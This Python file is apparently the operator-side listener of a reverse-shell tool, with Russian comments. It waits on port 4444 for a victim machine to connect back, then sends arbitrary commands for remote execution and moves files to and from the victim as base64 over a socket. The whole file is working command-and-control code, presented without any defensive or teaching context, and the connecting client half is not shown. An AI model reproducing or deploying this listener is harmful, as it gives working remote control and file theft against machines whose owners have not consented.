from  datetime import datetime
import json
import socket 
import base64
from typing import List
import config


class Server:
    
    def __init__(self, ip: str, port :int):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self._socket, self._remote_address = listener.accept()
        self._format_user = f"{self._remote_address[0]}:{self._remote_address[1]} >> "
        print(f"[+] Got a connection from {self._remote_address} ")
        self._command_executor = ServerExecutor(self._socket)
    
    def __del__(self):
        self.close()
        
    def run(self):
        while True:
            try:
                
                command = input(self._format_user)
                result = self._command_executor.process_command(command)
                print(result)
                
            except KeyboardInterrupt:
                self._command_executor.process_command("exit")
            except CdSynaxError:
                print()
            except UploadSyntaxError:
                print("Error --> No correct syntax upload!")
                print("Upload command should be format: 'upload' 'path file server' 'path file client'")
            except DownloadSyntaxError:
                print("Error --> No correct syntax download!")
                print("Download command should be format: 'download' 'path file client' 'path file server'")
            except Exception as e:
                print(e)
                
    def close(self):
        if self._socket:
            self._socket.close()
            self._socket = None

class ServerExecutor:
    """ Класс обрабатывает и исполняет команды от клиента и сервера """

    def __init__(self, socket :socket.socket ) -> None:
        self._socket = socket
    
    def _send(self, data :List[str]):
        json_data = json.dumps(data)
        self._socket.send(json_data.encode())
        
    def _recv(self):
        json_data = b""
        while True:
            try:
                json_data += self._socket.recv(config.BUFFSIZE)
                return json.loads(json_data)
            except ValueError:
                continue
            
    def _execute_remotely(self, command :List[str]):
        """ Метод запускает удаленно команду 
            и возвращает результат выполнения"""
        
        self._send(command)
        responce = self._recv()
        return responce
    
    def _check_exist_command(self, command :List[str]) -> bool:
        """ Метод проверяет существование команды в массиве """
        
        return True if command else False

    def _upload_data(self, command_list :List[str]) -> list:
        """ Метод загружает данные для отправки на клиент """
        
        result = BinaryExecutor.read_file(command_list[1])
        command_list.append(result.decode())
        return command_list

    def _download_data(self, path :str,  result : bytes) -> str:
        """ Метод загружает данные от клиента на сервер """
        
        BinaryExecutor.write_file(path, result)
        return f"[+] Write successful --> {path}"
    
    def _exit(self):
        """ Завершение программы """
        
        self._send(["exit"])
        self._socket.close()
        exit()
    
    def process_command(self, command :str) -> str:
        """ Обработка и проверка комманд перед выполнением """
        
        command_list = command.split(" ")
        if not self._check_exist_command(command_list):
            raise NotFoundCommand
        
        action = command_list[0]
        
        if action == "upload":
            if not len(command_list) == 3:
                raise UploadSyntaxError
            command_list = self._upload_data(command_list)
            result = self._execute_remotely(command_list)
        elif action == "download":
            if not len(command_list) == 3:
                raise DownloadSyntaxError
            result = self._execute_remotely(command_list)
            result = self._download_data(command_list[2], result)
        elif action == "exit":
            self._exit()
        else:
            result = self._execute_remotely(command_list)
            
        return result
                

class BinaryExecutor:
    """ Класс выполняет бинарные команды """
    
    @staticmethod
    def write_file(path :str = f"./file_{datetime.now()}", data :bytes = b""):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(data))
        
    @staticmethod
    def read_file(path :str) -> bytes:
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())
        

class NotFoundCommand(Exception): pass

class CdSynaxError(Exception):pass

class UploadSyntaxError(Exception): pass

class DownloadSyntaxError(Exception): pass


listener = Server("127.0.0.1",   4444)
listener.run()
 

